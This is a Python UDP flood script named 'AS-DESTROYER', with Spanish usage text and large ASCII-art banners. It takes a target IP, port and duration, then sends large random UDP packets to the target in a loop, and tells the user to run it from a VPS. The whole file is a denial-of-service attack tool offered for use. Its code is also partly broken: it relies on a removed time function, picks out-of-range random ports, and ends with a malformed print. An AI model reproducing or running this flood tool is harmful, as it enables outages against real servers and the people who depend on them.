#!/usr/bin/python
#by Eternal Demon
import socket,random,sys,time,os
from colorama import *
init()

#os.system(f'cls & mode 85,20 & title [A S - D E S T R O Y E R] - ATTACK PANEL')


if len(sys.argv)==1:
    sys.exit(f"""
{Fore.GREEN}
╦══════════════════════════════════════╗    
║ ╦ ╦  ╔═╗  ╦    ╔═╗  ╔═╗  ╔╦╗  ╔═╗    ║
║ ║║║  ║╣   ║    ║    ║ ║  ║║║  ║╣     ║
║ ╚╩╝  ╚═╝  ╩═╝  ╚═╝  ╚═╝  ╩ ╩  ╚═╝    ║
╩══════════════════════════════════════╝
{Fore.LIGHTYELLOW_EX}Made by Eternal Demon

{Fore.GREEN}Uso: AS-DESTROYER.py {Fore.RED}[ {Fore.GREEN}ip{Fore.RED} ] {Fore.RED}[ {Fore.GREEN}port{Fore.RED} ]{Fore.GREEN} 0 = random  {Fore.RED}[ {Fore.GREEN}tiempo{Fore.RED} ]{Fore.GREEN} 0 = infinito
    
{Fore.YELLOW} {Back.RED} --> Pls run this script in a VPS <--""")
 
def UDPFlood():
    port = int(sys.argv[2])
    randport=(True,False)[port==0]
    ip = sys.argv[1]
    dur = int(sys.argv[3])
    clock=(lambda:0,time.clock)[dur>0]
    duration=(1,(clock()+dur))[dur>0]
    print(f'''

    
{Fore.LIGHTCYAN_EX} █████╗     ███████╗              ██████╗     ███████╗    ███████╗    ████{Fore.RED}████╗    ██████╗      ██████╗     ██╗   ██╗    ███████╗    ██████╗ 
{Fore.LIGHTCYAN_EX}██╔══██╗    ██╔════╝              ██╔══██╗    ██╔════╝    ██╔════╝    ╚══█{Fore.RED}█╔══╝    ██╔══██╗    ██╔═══██╗    ╚██╗ ██╔╝    ██╔════╝    ██╔══██╗
{Fore.LIGHTCYAN_EX}███████║    ███████╗    █████╗    ██║  ██║    █████╗      ███████╗       █{Fore.RED}█║       ██████╔╝    ██║   ██║     ╚████╔╝     █████╗      ██████╔╝
{Fore.LIGHTCYAN_EX}██╔══██║    ╚════██║    ╚════╝    ██║  ██║    ██╔══╝      ╚════██║       █{Fore.RED}█║       ██╔══██╗    ██║   ██║      ╚██╔╝      ██╔══╝      ██╔══██╗
{Fore.LIGHTCYAN_EX}██║  ██║    ███████║              ██████╔╝    ███████╗    ███████║       █{Fore.RED}█║       ██║  ██║    ╚██████╔╝       ██║       ███████╗    ██║  ██║
{Fore.LIGHTCYAN_EX}╚═╝  ╚═╝    ╚══════╝              ╚═════╝     ╚══════╝    ╚══════╝       ╚{Fore.RED}═╝       ╚═╝  ╚═╝     ╚═════╝        ╚═╝       ╚══════╝    ╚═╝  ╚═╝        

{Fore.MAGENTA}                                                                         ██╗  ██╗  
{Fore.MAGENTA}╔═╗  ╔═╗  ╦ ╦  ╔═╗  ╦═╗  ╔═╗  ╦ ╦  ╦    ╦         ╦  ┌─┐┬ ┬┌─┐┬─┐        ██║  ██║
{Fore.MAGENTA}╠═╝  ║ ║  ║║║  ║╣   ╠╦╝  ╠╣   ║ ║  ║    ║         ║  ├─┤└┬┘├┤ ├┬┘        ███████║
{Fore.MAGENTA}╩    ╚═╝  ╚╩╝  ╚═╝  ╩╚═  ╚    ╚═╝  ╩═╝  ╩═╝       ╩═╝┴ ┴ ┴ └─┘┴└─        ╚════██║ 
{Fore.MAGENTA}                                                                              ██║
{Fore.MAGENTA}                                                                              ╚═╝          
''')
    print(f'''
    {Fore.RED}╔═╗╔═╗╔╗╔╔╦╗{Fore.LIGHTYELLOW_EX} ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═   
    {Fore.RED}╚═╗║╣ ║║║ ║║{Fore.LIGHTYELLOW_EX} ╠═╣ ║  ║ ╠═╣║  ╠╩╗   
    {Fore.RED}╚═╝╚═╝╝╚╝═╩╝{Fore.LIGHTYELLOW_EX} ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩{Fore.GREEN}ooo''')
    print(f'{Fore.GREEN}AS-DESTROYER V.1.0: %s : %s durante %s segundos'%(ip,port,dur or 'Infinito'))
    sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    bytes=random._urandom(15000)
    while True:
        port=(random.randint(1,15000000),port)[randport]
        if clock()<duration:
            sock.sendto(bytes,(ip,port))
        else:
            break
    print(f'''
    {Fore.RED}╔═╗╔╦╗╔═╗╔═╗{Fore.LIGHTYELLOW_EX}   ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═
    {Fore.RED}╚═╗ ║ ║ ║╠═╝{Fore.LIGHTYELLOW_EX}   ╠═╣ ║  ║ ╠═╣║  ╠╩╗
    {Fore.RED}╚═╝ ╩ ╚═╝╩  {Fore.LIGHTYELLOW_EX}   ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩{Fore.GREEN}ooo''')
    print(f'{Fore.GREEN}TARGET ->     %s : %s(ip,port')
UDPFlood()
